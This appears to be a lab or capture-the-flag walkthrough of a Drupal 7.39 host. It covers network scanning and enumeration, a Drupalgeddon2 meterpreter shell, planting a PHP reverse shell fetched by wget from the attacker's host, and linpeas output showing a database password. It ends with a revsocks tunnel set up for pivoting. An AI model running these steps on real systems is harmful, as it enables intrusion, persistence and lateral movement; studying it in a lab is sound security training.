# Corp

## Recon

We only have the network used by the machines Corp1 & Corp2 : `172.16.23.0/24`

### Network scanning

```bash
nmap -sCV --top-ports 5 -vvv -oA scan 172.16.23.0/24
```

Two machines seems to be up :

```sh
172.16.23.56 80,443 (Web Server)
172.16.23.7 53 (DNS Server)
```
The certificate for 172.16.23.56:443 informs us that the domain name that matches the IP is `drupal.corp.lab`
Lets add the DNS Server to our `/etc/resolv.conf`

We have a result on drupal.corp.lab

## Web application

We have a robots.txt file on `/robots.txt`

robots.txt
```bash
User-agent: *
Crawl-delay: 10
# Directories
Disallow: /includes/
Disallow: /misc/
Disallow: /modules/
Disallow: /profiles/
Disallow: /scripts/
Disallow: /themes/
# Files
Disallow: /CHANGELOG.txt      # Drupal 7.39
Disallow: /cron.php			  # DENIED
Disallow: /INSTALL.mysql.txt  # Useless
Disallow: /INSTALL.pgsql.txt  # Useless
Disallow: /INSTALL.sqlite.txt # Useless
Disallow: /install.php
Disallow: /INSTALL.txt
Disallow: /LICENSE.txt
Disallow: /MAINTAINERS.txt
Disallow: /update.php
Disallow: /UPGRADE.txt
Disallow: /xmlrpc.php
# Paths (clean URLs)
Disallow: /admin/
Disallow: /comment/reply/
Disallow: /filter/tips/
Disallow: /node/add/
Disallow: /search/
Disallow: /user/register/
Disallow: /user/password/
Disallow: /user/login/
Disallow: /user/logout/
# Paths (no clean URLs)
Disallow: /?q=admin/
Disallow: /?q=comment/reply/
Disallow: /?q=filter/tips/
Disallow: /?q=node/add/
Disallow: /?q=search/
Disallow: /?q=user/password/
Disallow: /?q=user/register/
Disallow: /?q=user/login/
Disallow: /?q=user/logout/
```
### Enumeration

**Gobuster**

```bash
/.php                 (Status: 403) [Size: 281]
/.html                (Status: 403) [Size: 281]
/search               (Status: 403) [Size: 7944]
/profiles             (Status: 301) [Size: 323] [--> https://drupal.corp.lab/profiles/]
/index.php            (Status: 200) [Size: 7994]
/0                    (Status: 200) [Size: 7994]
/themes               (Status: 301) [Size: 321] [--> https://drupal.corp.lab/themes/]
/admin                (Status: 403) [Size: 8101]
/sites                (Status: 301) [Size: 320] [--> https://drupal.corp.lab/sites/]
/misc                 (Status: 301) [Size: 319] [--> https://drupal.corp.lab/misc/]
/includes             (Status: 301) [Size: 323] [--> https://drupal.corp.lab/includes/]
```

**Droopescan**

```bash
droopescan scan drupal -u https://drupal.corp.lab
[+] Plugins found:
    profile https://drupal.corp.lab/modules/profile/
    php https://drupal.corp.lab/modules/php/
    image https://drupal.corp.lab/modules/image/

[+] Themes found:
    seven https://drupal.corp.lab/themes/seven/
    garland https://drupal.corp.lab/themes/garland/

[+] Possible version(s):
    7.39

[+] Possible interesting urls found:
    Default changelog file - https://drupal.corp.lab/CHANGELOG.txt
    Default admin - https://drupal.corp.lab/user/login

[+] Scan finished (0:08:04.144387 elapsed)
```

### Known CVE

Using durpalgeddon2 we have a meterpreter shell on the server as www-data

module options
```bash
RHOST https://durpal.corp.lab
RPORT 443
LHOST 192.168.56.3
LPORT 80
```

We have writing rights on `/var/www`, we can rename drupal to drupalbackup then copy drupalbackup to a new folder called drupal, and then put a reverse php shell in it.

```bash
mv drupal drupalbackup
cp -r drupalbackup drupal
cd drupal
wget 192.168.56.3/shell.php #/usr/share/webshells/php/php-reverse-shell.php
```

## Privilege escalation


### Enumeration

We found some default password. Might be useless.

linepeas.sh
```bash
╔══════════╣ Searching passwords in config PHP files
/var/www/drupal/sites/default/settings.php:      'password' => 'vUIj3OcWtinZ',
/var/www/drupal/sites/default/settings.php: *     'password' => 'password',
/var/www/drupal/sites/default/settings.php: *   'password' => 'password',
/var/www/drupalbackup/sites/default/settings.php:      'password' => 'vUIj3OcWtinZ',
/var/www/drupalbackup/sites/default/settings.php: *     'password' => 'password',
/var/www/drupalbackup/sites/default/settings.php: *   'password' => 'password',
```

### Rebound

Lets configure revsocks to establish a proxy to the client network.

kali
```bash
./revsocks_linux_amd64 -listen :443 -socks 127.0.0.1:1080 -pass test -tls
```

corp1
```bash
./revsocks_linux_amd64 -connect 192.168.56.3:443 -pass test -tls
```

Lets configure `proxychains` to run commands quicker

kali
```bash
echo "socks4  127.0.0.1 1080" >> /etc/proxychains4.conf
```